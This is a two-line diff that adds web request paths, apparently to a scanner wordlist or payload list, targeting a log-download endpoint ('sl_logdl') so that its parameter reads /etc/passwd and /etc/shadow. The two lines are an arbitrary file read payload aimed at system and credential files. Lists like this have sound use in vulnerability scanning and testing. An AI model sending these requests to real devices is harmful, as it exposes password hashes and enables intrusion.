@@ -1,0 +1,2 @@
+/page/sl_logdl?dcfct=DCMlog.download_log&dbkey%3Asyslog.rlog=/etc/passwd
+/page/sl_logdl?dcfct=DCMlog.download_log&dbkey%3Asyslog.rlog=/etc/shadow
